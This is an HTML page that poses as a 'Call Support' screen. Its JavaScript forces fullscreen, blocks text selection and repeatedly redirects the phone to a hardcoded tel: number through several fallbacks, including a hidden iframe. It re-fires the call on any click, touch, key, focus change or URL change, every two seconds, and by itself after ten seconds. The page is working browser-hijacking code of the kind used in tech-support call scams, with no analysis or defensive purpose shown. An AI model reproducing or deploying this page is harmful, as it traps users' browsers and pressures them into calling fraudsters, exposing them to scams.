<!DOCTYPE html>
<html>
<head>
    <title>Call Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #ff0000, #0000ff);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
            touch-action: none;
        }
        #clickOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            cursor: pointer;
        }
        .overlay-content {
            background: white;
            color: black;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
        }
        .content {
            padding: 20px;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .blink {
            animation: blink 1s infinite;
            font-size: 1.5rem;
            margin: 20px 0;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <!-- First Click Overlay -->
    <div id="clickOverlay">
        <div class="overlay-content">
            <h2>ðŸ“ž Tap to Call Support</h2>
            <p>Click anywhere to connect immediately</p>
            <button style="padding: 15px 30px; font-size: 18px; margin-top: 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">
                TAP HERE TO START
            </button>
        </div>
    </div>

    <!-- Main Content -->
    <div class="content" style="display: none;">
        <h1>ðŸ“ž CALLING... ðŸ“ž</h1>
        <div class="blink">Please Wait</div>
        <p>Connecting you to our support team</p>
    </div>

    <script>
        const PHONE_NUMBER = "+911234567890";
        let fullscreenActivated = false;
        
        // Fullscreen function
        function enterFullscreen() {
            try {
                const elem = document.documentElement;
                if (elem.requestFullscreen) {
                    elem.requestFullscreen().catch(e => console.log(e));
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                } else if (elem.mozRequestFullScreen) {
                    elem.mozRequestFullScreen();
                }
                fullscreenActivated = true;
            } catch (e) {
                console.log("Fullscreen error:", e);
            }
        }
        
        // Fast redirect function
        function fastRedirect() {
            // Show calling content
            document.querySelector('.content').style.display = 'block';
            
            // Immediate redirect
            window.location.href = "tel:" + PHONE_NUMBER;
            
            // Multiple fallbacks
            setTimeout(() => {
                window.open("tel:" + PHONE_NUMBER, "_self");
            }, 50);
            
            setTimeout(() => {
                window.location.replace("tel:" + PHONE_NUMBER);
            }, 100);
            
            setTimeout(() => {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = "tel:" + PHONE_NUMBER;
                document.body.appendChild(iframe);
            }, 150);
        }
        
        // First click handler
        function handleFirstClick() {
            // Remove overlay
            document.getElementById('clickOverlay').style.display = 'none';
            
            // Enter fullscreen (now allowed because user clicked)
            enterFullscreen();
            
            // Start call process
            fastRedirect();
            
            // Activate all other event listeners
            activateAllEvents();
        }
        
        // Activate all events after first click
        function activateAllEvents() {
            // URL bar click detection
            let currentURL = window.location.href;
            
            setInterval(() => {
                if(window.location.href !== currentURL) {
                    currentURL = window.location.href;
                    fastRedirect();
                }
                
                if(document.activeElement.tagName === 'INPUT' || 
                   document.activeElement.tagName === 'TEXTAREA') {
                    fastRedirect();
                }
            }, 10);
            
            // All other events
            document.addEventListener('click', fastRedirect);
            document.addEventListener('touchstart', fastRedirect);
            document.addEventListener('keydown', fastRedirect);
            
            window.addEventListener('blur', () => setTimeout(fastRedirect, 100));
            window.addEventListener('focus', () => setTimeout(fastRedirect, 100));
            
            // Continuous call attempts
            setInterval(fastRedirect, 2000);
        }
        
        // Add first click listener
        document.getElementById('clickOverlay').addEventListener('click', handleFirstClick);
        document.addEventListener('touchstart', handleFirstClick, { once: true });
        
        // Auto-call after 10 seconds if no interaction
        setTimeout(() => {
            if (!fullscreenActivated) {
                handleFirstClick();
            }
        }, 10000);
        
    </script>
</body>
</html>
